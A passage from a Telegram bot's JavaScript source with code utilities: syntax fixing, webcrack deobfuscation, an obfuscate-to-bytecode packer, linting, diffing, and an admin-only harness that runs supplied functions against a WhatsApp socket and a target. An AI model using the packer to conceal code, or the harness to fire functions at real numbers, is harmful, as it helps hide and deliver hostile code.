                    }

                    // ----------- ( fixcode tools: cek & auto-fix syntax js ) ------------ //
                    case "cekfunction": {
                        try {
                            if (!ctx.message.reply_to_message) {
                                return ctx.reply("❌ <b>Format Salah!</b>\nReply pesan yang berisi kode JavaScript dengan perintah /cekfunction", { parse_mode: "HTML" });
                            }

                            const code = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption;
                            if (!code || code.trim() === "") {
                                return ctx.reply("❌ Tidak ada kode yang ditemukan pada pesan tersebut.");
                            }

                            let acorn;
                            try {
                                const mod = await import("acorn");
                                acorn = mod.default || mod;
                            } catch {
                                return ctx.reply("❌ Module <code>acorn</code> belum terinstall.\nSilakan jalankan: <code>npm install acorn</code> di terminal lalu restart bot.", { parse_mode: "HTML" });
                            }

                            let fixedCode = code;
                            let fixLogs = [];

                            if (fixedCode.includes("botForwardedMessage")) {
                                fixedCode = fixedCode.replace(/botForwardedMessage/g, "botForwardMessage");
                                fixLogs.push("Mengubah <code>botForwardedMessage</code> menjadi <code>botForwardMessage</code> (Baileys Spec)");
                            }

                            if (/=\s+=\s+=/.test(fixedCode) || /=\s+=/.test(fixedCode)) {
                                fixedCode = fixedCode.replace(/=\s+=\s+=/g, "===").replace(/=\s+=/g, "==");
                                fixLogs.push("Memperbaiki spasi pada operator pembanding (<code>===</code> / <code>==</code>)");
                            }

                            try {
                                acorn.parse(fixedCode, { ecmaVersion: "latest", sourceType: "module", locations: true });

                                if (fixLogs.length > 0) {
                                    await botReply(ctx, "🌀 AUTO-FIX SUCCESS\n", [
                                        ["Status", "FIXED_AUTOMATICALLY"],
                                        ["Logs", fixLogs.join("\n")]
                                    ]);
                                    return ctx.reply(
                                        `📋 <b>Kode Hasil Perbaikan (Tinggal Copy):</b>\n<pre><code class="language-javascript">${fixedCode}</code></pre>`,
                                        { parse_mode: "HTML" }
                                    );
                                }

                                return await botReply(ctx, "🌀 SYNTAX CHECKER\n", [
                                    ["Status", "✅ VALID_SYNTAX"],
                                    ["Info", "Tidak ditemukan error syntax."]
                                ]);
                            } catch (err) {
                                const errorMsg = err.message;
                                const line = err.loc?.line || 0;
                                const col = err.loc?.column || 0;

                                const lines = fixedCode.split("\n");
                                const errorLine = lines[line - 1] || "";
                                const suspectToken = errorLine.substring(col).match(/^[a-zA-Z_$][a-zA-Z0-9_$]*/)?.[0] || "";

                                let explanation = "";
                                let suggestion = "";

                                if (errorMsg.includes("Unexpected token")) {
                                    const keywords = ["const", "let", "var", "function", "return", "if", "else", "for", "while", "async", "await", "try", "catch"];
                                    const closeMatches = keywords.filter(kw => {
                                        let diff = 0;
                                        for (let i = 0; i < Math.min(kw.length, suspectToken.length); i++) {
                                            if (kw[i] !== suspectToken[i]) diff++;
                                        }
                                        diff += Math.abs(kw.length - suspectToken.length);
                                        return diff <= 2 && kw !== suspectToken;
                                    });

                                    if (closeMatches.length > 0) {
                                        explanation = `Ditemukan token "${suspectToken}" yang tidak dikenali JavaScript.`;
                                        suggestion = `Ubah menjadi kata kunci yang benar: <code>${closeMatches.join(", ")}</code>`;
                                        fixedCode = lines.map((l, idx) => idx === (line - 1) ? l.replace(suspectToken, closeMatches[0]) : l).join("\n");
                                        fixLogs.push(`Mengganti typo kata kunci <code>${suspectToken}</code> menjadi <code>${closeMatches[0]}</code>`);
                                    } else {
                                        explanation = `Karakter atau kata "${suspectToken}" tidak seharusnya berada di posisi ini.`;
                                        suggestion = `Periksa tanda kutip, kurung pembuka/penutup, atau separator koma yang salah tempat.`;
                                    }
                                } else if (errorMsg.includes("Unexpected end of input")) {
                                    explanation = "Struktur kode terpotong. Kurang tanda kurung kurawal tutup '}', penutup ')', atau ']'";
                                    suggestion = "Pastikan setiap tanda pembuka blok kode memiliki pasangan penutupnya.";
                                } else {
                                    explanation = `Parser internal melaporkan: ${errorMsg}`;
                                    suggestion = "Periksa kembali baris instruksi tersebut secara teliti.";
                                }

                                const startLine = Math.max(1, line - 1);
                                const endLine = Math.min(lines.length, line + 1);
                                let snippet = "";
                                for (let i = startLine; i <= endLine; i++) {
                                    const prefix = i === line ? "> " : "  ";
                                    snippet += `${prefix}${i.toString().padStart(2, " ")} | ${lines[i - 1]}\n`;
                                    if (i === line) snippet += `     ${" ".repeat(col)}^\n`;
                                }

                                if (fixLogs.length > 0) {
                                    await botReply(ctx, "🌀 AUTO-FIX SUGGESTION\n", [
                                        ["Status", "SEMI_FIXED"],
                                        ["Line", `Baris ${line}, Kolom ${col}`],
                                        ["Fix Op", fixLogs[0]]
                                    ]);
                                    return ctx.reply(
                                        `📋 <b>Prediksi Kode Hasil Perbaikan:</b>\n<pre><code class="language-javascript">${fixedCode}</code></pre>`,
                                        { parse_mode: "HTML" }
                                    );
                                }

                                await botReply(ctx, "🌀 SYNTAX ERROR DITEMUKAN\n", [
                                    ["Posisi", `Baris ${line}, Kolom ${col}`],
                                    ["Log", errorMsg],
                                    ["Analisa", explanation],
                                    ["Saran", suggestion]
                                ]);
                                return ctx.reply(
                                    `📌 <b>Cuplikan Kode:</b>\n<pre><code>${snippet}</code></pre>`,
                                    { parse_mode: "HTML" }
                                );
                            }
                        } catch (e) {
                            console.error(e);
                            ctx.reply("❌ Terjadi kesalahan internal saat menganalisa data.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: rapikan file .js pakai worker thread ) ------------ //
                    case "fixcode": {
                        try {
                            const r = ctx.message.reply_to_message;
                            if (!r || !r.document) {
                                return ctx.reply("❌ Balas file .js dengan `/fixcode`!", { parse_mode: "Markdown" });
                            }

                            const fileName = r.document.file_name || "";
                            if (!fileName.toLowerCase().endsWith(".js")) {
                                return ctx.reply("❌ Balas file .js dengan `/fixcode`!", { parse_mode: "Markdown" });
                            }

                            const wait = await ctx.reply("⏳ Sedang memeriksa & memperbaiki kode...");

                            const tgFile = await ctx.api.getFile(r.document.file_id);
                            const fileUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            let code;
                            try {
                                code = await downloadTelegramFileText(fileUrl);
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                return ctx.reply(`❌ Gagal mengambil file dari Telegram (${e.message}). Coba kirim ulang /fixcode lagi.`, { parse_mode: "Markdown" });
                            }

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(fixcodeWorkerMain, { code });
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                if (/Cannot find module 'acorn'/.test(e.message)) {
                                    return ctx.reply("Module acorn belum terinstall.\nInstall dulu dengan: npm install acorn\nLalu restart bot.");
                                }
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}

                            if (!workerResult.ok) {
                                if (/Cannot find module 'acorn'/.test(workerResult.error || "")) {
                                    return ctx.reply("Module acorn belum terinstall.\nInstall dulu dengan: npm install acorn\nLalu restart bot.");
                                }
                                return ctx.reply(`❌ Gagal memproses: ${workerResult.error}`);
                            }

                            const { finalCode, fixedNotes, unresolved } = workerResult;

                            const outPath = path.join(os.tmpdir(), `donefixcode_${ctx.chat.id}_${Date.now()}.js`);
                            fs.writeFileSync(outPath, finalCode, "utf8");

                            let statusText, notesText;
                            if (unresolved) {
                                statusText = "⚠️ Sebagian diperbaiki otomatis";
                                notesText  = fixedNotes.map(n => `• ${n}`).join("\n") || "-";
                            } else if (fixedNotes.length) {
                                statusText = "✅ Kode berhasil diperbaiki";
                                notesText  = fixedNotes.map(n => `• ${n}`).join("\n");
                            } else {
                                statusText = "✅ Kode sudah valid, tidak ada error";
                                notesText  = "-";
                            }

                            await ctx.replyWithDocument(new InputFile(outPath, "donefixcode.js"));
                            await botReply(ctx, "🔧 FIX CODE\n", [
                                ["Status", statusText],
                                ["Catatan", notesText]
                            ]);

                            try { fs.unlinkSync(outPath); } catch {}
                        } catch (e) {
                            console.error("Error /fixcode:", e.message);
                            ctx.reply("❌ Terjadi kesalahan saat memproses file.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: deobfuscate file .js ) ------------ //
                    case "deobfuscate": {
                        try {
                            const r = ctx.message.reply_to_message;
                            if (!r || !r.document) {
                                return ctx.reply("❌ <b>Format Salah!</b>\nBalas (reply) file <code>.js</code> yang ter-obfuscate dengan perintah <code>/deobfuscate</code>", { parse_mode: "HTML" });
                            }

                            const fileName = r.document.file_name || "";
                            if (!fileName.toLowerCase().endsWith(".js")) {
                                return ctx.reply("❌ <b>Gagal:</b> Berkas harus memiliki ekstensi <code>.js</code> untuk dideobfuscate.", { parse_mode: "HTML" });
                            }

                            const wait = await ctx.reply("🪐 <code>[SYSTEM] Initialization AST Deobfuscator Engine...</code>", { parse_mode: "HTML" });

                            const tgFile = await ctx.api.getFile(r.document.file_id);
                            const fileUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            let code;
                            try {
                                code = await downloadTelegramFileText(fileUrl);
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                return ctx.reply(`❌ Gagal mengambil berkas dari Telegram: <code>${e.message}</code>`, { parse_mode: "HTML" });
                            }

                            const stamp   = `${ctx.chat.id}_${Date.now()}`;
                            const outPath = path.join(os.tmpdir(), `deobf_${stamp}.js`);

                            await ctx.api.editMessageText(ctx.chat.id, wait.message_id, "🔃 <code>[DEOBFUSCATING] Decoding String Arrays & Unpacking...</code>", { parse_mode: "HTML" });

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(deobfuscateWorkerMain, { code });
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            if (!workerResult.ok) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                if (/Cannot find module 'webcrack'/.test(workerResult.error || "")) {
                                    return ctx.reply("❌ <b>Modul webcrack belum terinstall!</b>\nSilakan jalankan: <code>npm install webcrack</code> di terminal VPS Anda lalu restart bot.", { parse_mode: "HTML" });
                                }
                                return ctx.reply(`❌ <b>Proses Gagal:</b> Struktur enkripsi file terlalu rusak atau tidak didukung oleh AST Parser.\nDetail: <code>${workerResult.error}</code>`, { parse_mode: "HTML" });
                            }

                            try {
                                fs.writeFileSync(outPath, workerResult.finalCode, "utf8");

                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}

                                await ctx.replyWithDocument(new InputFile(outPath, `crack_${fileName}`));
                                await botReply(ctx, "🔓 DEOBFUSCATE\n", [
                                    ["Status", "✅ Berhasil di-restore"],
                                    ["File", `crack_${fileName}`],
                                    ["Engine", "Webcrack AST"]
                                ]);
                            } catch (writeErr) {
                                console.error("Gagal deobfuscate:", writeErr.message);
                                await ctx.reply(`❌ <b>Proses Gagal:</b> ${writeErr.message}`, { parse_mode: "HTML" });
                            }

                            try { if (fs.existsSync(outPath)) fs.unlinkSync(outPath); } catch {}
                        } catch (e) {
                            console.error("Error global /deobfuscate:", e.message);
                            ctx.reply("❌ Terjadi kesalahan internal sistem saat mengeksekusi deobfuscator.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: enkripsi js ke bytecode ) ------------ //
                    case "encjs": {
                        try {
                            const r = ctx.message.reply_to_message;
                            if (!r || !r.document) {
                                return ctx.reply("❌ Balas file .js dengan `/encjs`!", { parse_mode: "Markdown" });
                            }

                            const fileName = r.document.file_name || "";
                            if (!fileName.toLowerCase().endsWith(".js")) {
                                return ctx.reply("❌ Balas file .js dengan `/encjs`!", { parse_mode: "Markdown" });
                            }

                            const wait = await ctx.reply("⏳ Sedang mengenkripsi & compile ke bytecode...");

                            const tgFile = await ctx.api.getFile(r.document.file_id);
                            const fileUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                            let code;
                            try {
                                code = await downloadTelegramFileText(fileUrl);
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                return ctx.reply(`❌ Gagal mengambil file dari Telegram (${e.message}). Coba kirim ulang /encjs lagi.`, { parse_mode: "Markdown" });
                            }

                            const stamp     = `${ctx.chat.id}_${Date.now()}`;
                            const tmpJsPath = path.join(os.tmpdir(), `enc_${stamp}.js`);
                            const jscPath   = path.join(os.tmpdir(), `encrypted_${stamp}.jsc`);

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(encjsWorkerMain, { code, tmpJsPath, jscPath });
                            } catch (e) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            if (!workerResult.ok) {
                                try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}
                                const msg = workerResult.error || "";
                                if (/Cannot find module 'javascript-obfuscator'/.test(msg)) {
                                    return ctx.reply("Module javascript-obfuscator belum terinstall.\nInstall dulu dengan: npm install javascript-obfuscator\nLalu restart bot.");
                                }
                                if (/Cannot find module 'bytenode'/.test(msg)) {
                                    return ctx.reply("Module bytenode belum terinstall.\nInstall dulu dengan: npm install bytenode\nLalu restart bot.");
                                }
                                return ctx.reply(`❌ Gagal memproses: ${msg}`);
                            }

                            const loaderCode =
`// loader.js — jalankan/require FILE INI, jangan langsung ke encrypted.jsc
require('bytenode');
module.exports = require('./encrypted.jsc');
`;
                            const loaderPath = path.join(os.tmpdir(), `loader_${stamp}.js`);
                            fs.writeFileSync(loaderPath, loaderCode, "utf8");

                            try { await ctx.api.deleteMessage(ctx.chat.id, wait.message_id); } catch {}

                            await ctx.replyWithDocument(new InputFile(jscPath, "encrypted.jsc"));
                            await ctx.replyWithDocument(new InputFile(loaderPath, "loader.js"));

                            await botReply(ctx, "🔒 ENCRYPT TO BYTECODE\n", [
                                ["Status", "✅ Berhasil dienkripsi"],
                                ["Proses", "Obfuscate (control-flow flattening, string array RC4, dead code injection) → compile bytecode via bytenode"],
                                ["Wajib pakai", "loader.js (jangan require encrypted.jsc langsung)"],
                                ["Terikat Node.js", process.version + " — kalau server ganti versi, wajib /encjs ulang dari source asli"]
                            ]);

                            try { fs.unlinkSync(tmpJsPath); } catch {}
                            try { fs.unlinkSync(jscPath); } catch {}
                            try { fs.unlinkSync(loaderPath); } catch {}
                        } catch (e) {
                            console.error("Error /encjs:", e.message);
                            ctx.reply("❌ Terjadi kesalahan saat memproses file.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: rapikan format kode, tanpa fix logic ) ------------ //
                    case "beautify": {
                        try {
                            const got = await getReplyJsCode(ctx);
                            if (!got) return ctx.reply("❌ Reply file .js atau pesan berisi kode JavaScript dengan /beautify");

                            const wait = await ctx.reply("⏳ Merapikan format kode...");

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(beautifyWorkerMain, { code: got.code });
                            } catch (e) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            if (!workerResult.ok) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                if (/Cannot find module 'prettier'/.test(workerResult.error || "")) {
                                    return ctx.reply("❌ Module prettier belum terinstall.\nInstall dulu dengan: npm install prettier\nLalu restart bot.");
                                }
                                return ctx.reply(`❌ Gagal merapikan, kemungkinan ada syntax error: ${workerResult.error}`);
                            }

                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            const outPath = path.join(os.tmpdir(), `beautify_${ctx.chat.id}_${Date.now()}.js`);
                            fs.writeFileSync(outPath, workerResult.formatted, "utf8");
                            await ctx.replyWithDocument(new InputFile(outPath, `beautify_${got.fileName}`));
                            await botReply(ctx, "✨ BEAUTIFY CODE\n", [
                                ["Status", "✅ Format kode dirapikan (prettier)"],
                                ["File", `beautify_${got.fileName}`]
                            ]);
                            try { fs.unlinkSync(outPath); } catch {}
                        } catch (err) {
                            console.error("Error /beautify:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat merapikan kode.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: kompres/minify kode ) ------------ //
                    case "minify": {
                        try {
                            const got = await getReplyJsCode(ctx);
                            if (!got) return ctx.reply("❌ Reply file .js atau pesan berisi kode JavaScript dengan /minify");

                            const wait = await ctx.reply("⏳ Mengompres kode (minify)...");

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(minifyWorkerMain, { code: got.code });
                            } catch (e) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            if (!workerResult.ok) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                if (/Cannot find module 'terser'/.test(workerResult.error || "")) {
                                    return ctx.reply("❌ Module terser belum terinstall.\nInstall dulu dengan: npm install terser\nLalu restart bot.");
                                }
                                return ctx.reply(`❌ Gagal minify, kemungkinan ada syntax error: ${workerResult.error}`);
                            }

                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            const before = got.code.length;
                            const after = workerResult.code.length;
                            const persen = before ? (((before - after) / before) * 100).toFixed(1) : 0;

                            const outPath = path.join(os.tmpdir(), `minify_${ctx.chat.id}_${Date.now()}.js`);
                            fs.writeFileSync(outPath, workerResult.code, "utf8");
                            await ctx.replyWithDocument(new InputFile(outPath, `min_${got.fileName}`));
                            await botReply(ctx, "📦 MINIFY CODE\n", [
                                ["Status", "✅ Berhasil dikompres"],
                                ["Ukuran", `${before} → ${after} karakter`],
                                ["Hemat", `${persen}%`]
                            ]);
                            try { fs.unlinkSync(outPath); } catch {}
                        } catch (err) {
                            console.error("Error /minify:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat minify kode.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: statistik file kode ) ------------ //
                    case "statcode": {
                        try {
                            const got = await getReplyJsCode(ctx);
                            if (!got) return ctx.reply("❌ Reply file .js atau pesan berisi kode JavaScript dengan /statcode");

                            const code = got.code;
                            const lines = code.split("\n");
                            const totalLines = lines.length;
                            const kosong = lines.filter((l) => !l.trim()).length;
                            const komentar = lines.filter((l) => /^\s*(\/\/|\/\*|\*)/.test(l)).length;
                            const size = Buffer.byteLength(code, "utf8");

                            let acorn;
                            try {
                                const mod = await import("acorn");
                                acorn = mod.default || mod;
                            } catch {
                                return ctx.reply("❌ Module acorn belum terinstall.\nInstall dulu dengan: npm install acorn\nLalu restart bot.");
                            }

                            let jumlahFunction = 0, jumlahAsync = 0, jumlahImport = 0;
                            let syntaxNote = "✅ Valid";

                            try {
                                const ast = acorn.parse(code, { ecmaVersion: "latest", sourceType: "module", locations: true });

                                const walk = (node) => {
                                    if (!node || typeof node.type !== "string") return;

                                    if (["FunctionDeclaration", "FunctionExpression", "ArrowFunctionExpression"].includes(node.type)) {
                                        jumlahFunction++;
                                        if (node.async) jumlahAsync++;
                                    }
                                    if (node.type === "ImportDeclaration") jumlahImport++;

                                    for (const key in node) {
                                        if (["type", "loc", "start", "end", "range"].includes(key)) continue;
                                        const val = node[key];
                                        if (Array.isArray(val)) val.forEach((v) => v && typeof v === "object" && walk(v));
                                        else if (val && typeof val === "object") walk(val);
                                    }
                                };
                                walk(ast);
                            } catch (e) {
                                syntaxNote = `❌ Syntax error (baris ${e.loc?.line || "?"})`;
                            }

                            await botReply(ctx, "📊 STATISTIK KODE\n", [
                                ["File", got.fileName],
                                ["Total baris", totalLines],
                                ["Baris kosong", kosong],
                                ["Baris komentar", komentar],
                                ["Ukuran", `${size} bytes`],
                                ["Jumlah function", jumlahFunction],
                                ["Function async", jumlahAsync],
                                ["Import statement", jumlahImport],
                                ["Syntax", syntaxNote]
                            ]);
                        } catch (err) {
                            console.error("Error /statcode:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat menganalisa kode.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: ekstrak daftar function ) ------------ //
                    case "extractfunc": {
                        try {
                            const got = await getReplyJsCode(ctx);
                            if (!got) return ctx.reply("❌ Reply file .js atau pesan berisi kode JavaScript dengan /extractfunc");

                            let acorn;
                            try {
                                const mod = await import("acorn");
                                acorn = mod.default || mod;
                            } catch {
                                return ctx.reply("❌ Module acorn belum terinstall.\nInstall dulu dengan: npm install acorn\nLalu restart bot.");
                            }

                            let ast;
                            try {
                                ast = acorn.parse(got.code, { ecmaVersion: "latest", sourceType: "module", locations: true });
                            } catch (e) {
                                return ctx.reply(`❌ Gagal parse kode, ada syntax error di baris ${e.loc?.line || "?"}.`);
                            }

                            const found = [];
                            const walk = (node) => {
                                if (!node || typeof node.type !== "string") return;

                                if (node.type === "FunctionDeclaration" && node.id) {
                                    found.push(`${node.async ? "async " : ""}function ${node.id.name}() — baris ${node.loc.start.line}`);
                                }
                                if (
                                    node.type === "VariableDeclarator" &&
                                    node.init &&
                                    ["FunctionExpression", "ArrowFunctionExpression"].includes(node.init.type) &&
                                    node.id?.name
                                ) {
                                    const tanda = node.init.type === "ArrowFunctionExpression" ? "() =>" : "function()";
                                    found.push(`${node.init.async ? "async " : ""}${node.id.name} = ${tanda} — baris ${node.loc.start.line}`);
                                }
                                if (
                                    (node.type === "MethodDefinition" || node.type === "Property") &&
                                    node.key?.name &&
                                    node.value?.type?.includes("Function")
                                ) {
                                    found.push(`${node.value.async ? "async " : ""}${node.key.name}() — baris ${node.loc.start.line}`);
                                }

                                for (const key in node) {
                                    if (["type", "loc", "start", "end", "range"].includes(key)) continue;
                                    const val = node[key];
                                    if (Array.isArray(val)) val.forEach((v) => v && typeof v === "object" && walk(v));
                                    else if (val && typeof val === "object") walk(val);
                                }
                            };
                            walk(ast);

                            if (!found.length) {
                                return ctx.reply("ℹ️ Tidak ditemukan function bernama di file ini.");
                            }

                            await botList(ctx, `📋 DAFTAR FUNCTION (${got.fileName})\n`, found, "Tidak ada function.");
                        } catch (err) {
                            console.error("Error /extractfunc:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat mengekstrak function.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: lint kode, cari warning/error ) ------------ //
                    case "lint": {
                        try {
                            const got = await getReplyJsCode(ctx);
                            if (!got) return ctx.reply("❌ Reply file .js atau pesan berisi kode JavaScript dengan /lint");

                            const wait = await ctx.reply("⏳ Menjalankan lint pada kode...");

                            let workerResult;
                            try {
                                workerResult = await runInlineWorker(lintWorkerMain, { code: got.code, fileName: got.fileName });
                            } catch (e) {
                                if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                                return ctx.reply(`❌ Worker gagal: ${e.message}`);
                            }

                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            if (!workerResult.ok) {
                                if (/Cannot find module 'eslint'/.test(workerResult.error || "")) {
                                    return ctx.reply("❌ Module eslint belum terinstall.\nInstall dulu dengan: npm install eslint\nLalu restart bot.\n(Command ini pakai config ESLint v8 classic API)");
                                }
                                return ctx.reply(`❌ Gagal menjalankan lint: ${workerResult.error}`);
                            }

                            const messages = workerResult.messages;
                            if (!messages.length) {
                                return ctx.reply("✅ Lint bersih, tidak ada warning/error yang ditemukan.");
                            }

                            const rows = messages
                                .slice(0, 20)
                                .map((m) => `${m.severity === 2 ? "❌" : "⚠️"} Baris ${m.line}: ${m.message} (${m.ruleId || "-"})`);

                            await botList(ctx, `🔍 LINT RESULT (${got.fileName})\n`, rows);

                            if (messages.length > 20) {
                                await ctx.reply(`ℹ️ Menampilkan 20 dari ${messages.length} temuan.`);
                            }
                        } catch (err) {
                            console.error("Error /lint:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat lint kode.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: bandingkan 2 file kode ) ------------ //
                    case "diffcode": {
                        try {
                            const rFirst = ctx.message.reply_to_message;
                            const secondDoc = ctx.message.document;

                            if (!rFirst?.document || !secondDoc) {
                                return ctx.reply("❌ Format: reply file .js PERTAMA, lalu kirim file .js KEDUA dengan caption /diffcode");
                            }

                            let diffLib;
                            try {
                                diffLib = await import("diff");
                            } catch {
                                return ctx.reply("❌ Module diff belum terinstall.\nInstall dulu dengan: npm install diff\nLalu restart bot.");
                            }

                            const wait = await ctx.reply("⏳ Membandingkan 2 file...");

                            const fileA = await ctx.api.getFile(rFirst.document.file_id);
                            const fileB = await ctx.api.getFile(secondDoc.file_id);
                            const urlA = `https://api.telegram.org/file/bot${ctx.api.token}/${fileA.file_path}`;
                            const urlB = `https://api.telegram.org/file/bot${ctx.api.token}/${fileB.file_path}`;

                            const [codeA, codeB] = await Promise.all([
                                downloadTelegramFileText(urlA),
                                downloadTelegramFileText(urlB)
                            ]);

                            const changes = diffLib.diffLines(codeA, codeB);
                            if (wait) await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});

                            if (!changes.some((c) => c.added || c.removed)) {
                                return ctx.reply("✅ Kedua file identik, tidak ada perbedaan.");
                            }

                            let hasil = "";
                            changes.forEach((part) => {
                                const prefix = part.added ? "+" : part.removed ? "-" : " ";
                                const partLines = part.value.split("\n");
                                partLines.forEach((l, i) => {
                                    if (i === partLines.length - 1 && l === "") return;
                                    hasil += `${prefix} ${l}\n`;
                                });
                            });

                            if (hasil.length > 3500) {
                                const outPath = path.join(os.tmpdir(), `diff_${ctx.chat.id}_${Date.now()}.diff`);
                                fs.writeFileSync(outPath, hasil, "utf8");
                                await ctx.replyWithDocument(new InputFile(outPath, "hasil.diff"));
                                await botReply(ctx, "🆚 DIFF CODE\n", [
                                    ["Status", "📄 Hasil diff terlalu panjang, dikirim sebagai file"]
                                ]);
                                try { fs.unlinkSync(outPath); } catch {}
                            } else {
                                const safe = hasil.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
                                await ctx.reply(`<pre>${safe}</pre>`, { parse_mode: "HTML" });
                            }
                        } catch (err) {
                            console.error("Error /diffcode:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat membandingkan file.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: validasi syntax JSON ) ------------ //
                    case "validatejson": {
                        try {
                            const r = ctx.message.reply_to_message;
                            let code;
                            let fileName = "config.json";

                            if (r?.document) {
                                fileName = r.document.file_name || fileName;
                                const tgFile = await ctx.api.getFile(r.document.file_id);
                                const fileUrl = `https://api.telegram.org/file/bot${ctx.api.token}/${tgFile.file_path}`;
                                code = await downloadTelegramFileText(fileUrl);
                            } else if (r?.text || r?.caption) {
                                code = r.text || r.caption;
                            } else {
                                return ctx.reply("❌ Reply file .json atau pesan berisi teks JSON dengan /validatejson");
                            }

                            try {
                                const parsed = JSON.parse(code);
                                const jumlahKey = typeof parsed === "object" && parsed !== null ? Object.keys(parsed).length : 0;

                                await botReply(ctx, "✅ JSON VALID\n", [
                                    ["File", fileName],
                                    ["Tipe", Array.isArray(parsed) ? "Array" : typeof parsed],
                                    ["Jumlah key/item", jumlahKey]
                                ]);
                            } catch (e) {
                                const match = e.message.match(/position (\d+)/);
                                let posInfo = "";
                                if (match) {
                                    const pos = parseInt(match[1], 10);
                                    const line = code.slice(0, pos).split("\n").length;
                                    posInfo = ` (sekitar baris ${line})`;
                                }

                                await botReply(ctx, "❌ JSON TIDAK VALID\n", [
                                    ["File", fileName],
                                    ["Error", e.message + posInfo]
                                ]);
                            }
                        } catch (err) {
                            console.error("Error /validatejson:", err.message);
                            ctx.reply("❌ Terjadi kesalahan saat memvalidasi JSON.");
                        }
                        break;
                    }

                    // ----------- ( fixcode tools: tes function pakai sock & target dummy ) ------------ //
                    // Contoh kode yang didukung:
                    // async function roni(sock, target) { await sock.sendMessage(target, {...}); }
                    case "testfunction": {
                        if (!isAdmin(uid)) {
                            return botError(ctx, "Khusus admin/owner (command ini menjalankan kode di server).");
                        }

                        const gotTest = await getReplyJsCode(ctx);
                        if (!gotTest) {
                            return ctx.reply(
                                "❌ Reply file .js atau pesan berisi kode function dengan /testfunction\n" +
                                "Contoh:\nasync function Shoco(sock, target) {\n  await sock.sendMessage(target, { text: 'hi' });\n}"
                            );
                        }

                        let acornTF;
                        try {
                            const mod = await import("acorn");
                            acornTF = mod.default || mod;
                        } catch {
                            return ctx.reply("❌ Module acorn belum terinstall.\nInstall dulu dengan: npm install acorn\nLalu restart bot.");
                        }

                        let astTF;
                        try {
                            astTF = acornTF.parse(gotTest.code, { ecmaVersion: "latest", sourceType: "module", locations: true });
                        } catch (e) {
                            return ctx.reply(`❌ Gagal parse kode, ada syntax error di baris ${e.loc?.line || "?"}.`);
                        }

                        // cari nama function pertama, dukung "function nama(...)" ATAU "const nama = (...) => {}"
                        let funcName = null;
                        const walkFind = (node) => {
                            if (funcName || !node || typeof node.type !== "string") return;

                            if (node.type === "FunctionDeclaration" && node.id) {
                                funcName = node.id.name;
                                return;
                            }
                            if (
                                node.type === "VariableDeclarator" &&
                                node.init &&
                                ["FunctionExpression", "ArrowFunctionExpression"].includes(node.init.type) &&
                                node.id?.name
                            ) {
                                funcName = node.id.name;
                                return;
                            }

                            for (const key in node) {
                                if (["type", "loc", "start", "end", "range"].includes(key)) continue;
                                const val = node[key];
                                if (Array.isArray(val)) val.forEach((v) => v && typeof v === "object" && walkFind(v));
                                else if (val && typeof val === "object") walkFind(val);
                            }
                        };
                        walkFind(astTF);

                        if (!funcName) {
                            return ctx.reply(
                                "❌ Tidak ditemukan function bernama di kode.\n" +
                                "Pakai bentuk: async function namaFungsi(sock, target) { ... } atau const namaFungsi = async (sock, target) => { ... }"
                            );
                        }

                        let waitTF;
                        try {
                            waitTF = await ctx.reply(
